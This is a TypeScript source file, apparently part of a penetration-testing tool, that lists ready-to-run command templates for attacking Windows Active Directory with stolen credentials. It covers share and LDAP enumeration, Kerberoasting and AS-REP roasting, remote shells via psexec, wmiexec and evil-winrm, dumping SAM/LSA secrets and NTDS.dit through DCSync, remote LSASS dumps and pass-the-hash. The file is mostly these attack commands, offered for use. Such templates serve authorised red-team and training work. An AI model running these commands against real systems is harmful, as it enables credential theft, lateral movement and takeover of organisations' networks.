/**
 * Credential Action Templates
 *
 * Command templates for using credentials in attacks.
 * Placeholders: <IP>, <USER>, <PASS>, <DOMAIN>, <HASH>
 */

import type { CommandAction } from '../types/actions';

/** Credential-based attack actions */
export const CREDENTIAL_ACTIONS: CommandAction[] = [
  // ═══════════════════════════════════════════════════════════════════════════
  // ENUMERATION
  // ═══════════════════════════════════════════════════════════════════════════
  {
    id: 'smbclient',
    label: 'SMBClient',
    category: 'Enumeration',
    command: 'smbclient -U "<DOMAIN>/<USER>%<PASS>" -L //<IP>',
    description: 'List SMB shares',
  },
  {
    id: 'smbmap',
    label: 'SMBMap',
    category: 'Enumeration',
    command: 'smbmap -u "<USER>" -p "<PASS>" -d "<DOMAIN>" -H <IP>',
    description: 'Enumerate SMB shares and permissions',
  },
  {
    id: 'cme-smb',
    label: 'CrackMapExec SMB',
    category: 'Enumeration',
    command: 'crackmapexec smb <IP> -u "<USER>" -p "<PASS>" -d "<DOMAIN>"',
    description: 'SMB enumeration with CrackMapExec',
  },
  {
    id: 'cme-smb-shares',
    label: 'CME SMB Shares',
    category: 'Enumeration',
    command: 'crackmapexec smb <IP> -u "<USER>" -p "<PASS>" -d "<DOMAIN>" --shares',
    description: 'Enumerate shares with CrackMapExec',
  },
  {
    id: 'ldapsearch',
    label: 'LDAP Search',
    category: 'Enumeration',
    command: 'ldapsearch -x -H ldap://<IP> -D "<USER>@<DOMAIN>" -w "<PASS>" -b "DC=${<DOMAIN>%%.*},DC=${<DOMAIN>#*.}"',
    description: 'LDAP enumeration',
  },
  {
    id: 'rpcclient',
    label: 'RPCClient',
    category: 'Enumeration',
    command: 'rpcclient -U "<DOMAIN>/<USER>%<PASS>" <IP>',
    description: 'RPC enumeration',
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // KERBEROS
  // ═══════════════════════════════════════════════════════════════════════════
  {
    id: 'kerberoast',
    label: 'Kerberoast',
    category: 'Kerberos',
    command: 'GetUserSPNs.py "<DOMAIN>/<USER>:<PASS>" -dc-ip <IP> -request',
    description: 'Request TGS tickets for service accounts',
  },
  {
    id: 'asreproast',
    label: 'AS-REP Roast',
    category: 'Kerberos',
    command: 'GetNPUsers.py "<DOMAIN>/" -usersfile users.txt -dc-ip <IP> -format hashcat',
    description: 'Find AS-REP roastable users',
  },
  {
    id: 'gettgt',
    label: 'Get TGT',
    category: 'Kerberos',
    command: 'getTGT.py "<DOMAIN>/<USER>:<PASS>" -dc-ip <IP>',
    description: 'Request TGT for user',
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // REMOTE ACCESS
  // ═══════════════════════════════════════════════════════════════════════════
  {
    id: 'psexec',
    label: 'PSExec',
    category: 'Remote Access',
    command: 'psexec.py "<DOMAIN>/<USER>:<PASS>@<IP>"',
    description: 'Get shell via PSExec',
  },
  {
    id: 'wmiexec',
    label: 'WMIExec',
    category: 'Remote Access',
    command: 'wmiexec.py "<DOMAIN>/<USER>:<PASS>@<IP>"',
    description: 'Get shell via WMI',
  },
  {
    id: 'smbexec',
    label: 'SMBExec',
    category: 'Remote Access',
    command: 'smbexec.py "<DOMAIN>/<USER>:<PASS>@<IP>"',
    description: 'Get shell via SMB',
  },
  {
    id: 'atexec',
    label: 'AtExec',
    category: 'Remote Access',
    command: 'atexec.py "<DOMAIN>/<USER>:<PASS>@<IP>" "whoami"',
    description: 'Execute command via Task Scheduler',
  },
  {
    id: 'evil-winrm',
    label: 'Evil-WinRM',
    category: 'Remote Access',
    command: 'evil-winrm -i <IP> -u "<USER>" -p "<PASS>"',
    description: 'Get shell via WinRM',
  },
  {
    id: 'xfreerdp',
    label: 'RDP (xfreerdp)',
    category: 'Remote Access',
    command: 'xfreerdp /v:<IP> /u:"<DOMAIN>\\<USER>" /p:"<PASS>" /cert:ignore',
    description: 'RDP connection',
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // SECRETS / POST-EXPLOITATION
  // ═══════════════════════════════════════════════════════════════════════════
  {
    id: 'secretsdump',
    label: 'Secrets Dump',
    category: 'Secrets',
    command: 'secretsdump.py "<DOMAIN>/<USER>:<PASS>@<IP>"',
    description: 'Dump SAM, LSA secrets, cached creds',
  },
  {
    id: 'secretsdump-dc',
    label: 'DCSync (secretsdump)',
    category: 'Secrets',
    command: 'secretsdump.py "<DOMAIN>/<USER>:<PASS>@<IP>" -just-dc',
    description: 'DCSync - dump NTDS.dit',
  },
  {
    id: 'lsassy',
    label: 'Lsassy',
    category: 'Secrets',
    command: 'lsassy -d "<DOMAIN>" -u "<USER>" -p "<PASS>" <IP>',
    description: 'Remote lsass dump',
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // PASS-THE-HASH (use <HASH> placeholder)
  // ═══════════════════════════════════════════════════════════════════════════
  {
    id: 'pth-psexec',
    label: 'PTH PSExec',
    category: 'Pass-the-Hash',
    command: 'psexec.py "<DOMAIN>/<USER>@<IP>" -hashes :<HASH>',
    description: 'PSExec with NTLM hash',
  },
  {
    id: 'pth-wmiexec',
    label: 'PTH WMIExec',
    category: 'Pass-the-Hash',
    command: 'wmiexec.py "<DOMAIN>/<USER>@<IP>" -hashes :<HASH>',
    description: 'WMIExec with NTLM hash',
  },
  {
    id: 'pth-evil-winrm',
    label: 'PTH Evil-WinRM',
    category: 'Pass-the-Hash',
    command: 'evil-winrm -i <IP> -u "<USER>" -H "<HASH>"',
    description: 'Evil-WinRM with NTLM hash',
  },
  {
    id: 'pth-cme',
    label: 'PTH CrackMapExec',
    category: 'Pass-the-Hash',
    command: 'crackmapexec smb <IP> -u "<USER>" -H "<HASH>" -d "<DOMAIN>"',
    description: 'CrackMapExec with NTLM hash',
  },
];

/** Get actions grouped by category */
export function getCredentialActionsByCategory(): Map<string, CommandAction[]> {
  const groups = new Map<string, CommandAction[]>();
  for (const action of CREDENTIAL_ACTIONS) {
    const existing = groups.get(action.category) || [];
    existing.push(action);
    groups.set(action.category, existing);
  }
  return groups;
}

/** Category display order */
export const CREDENTIAL_CATEGORY_ORDER = [
  'Enumeration',
  'Kerberos',
  'Remote Access',
  'Secrets',
  'Pass-the-Hash',
];
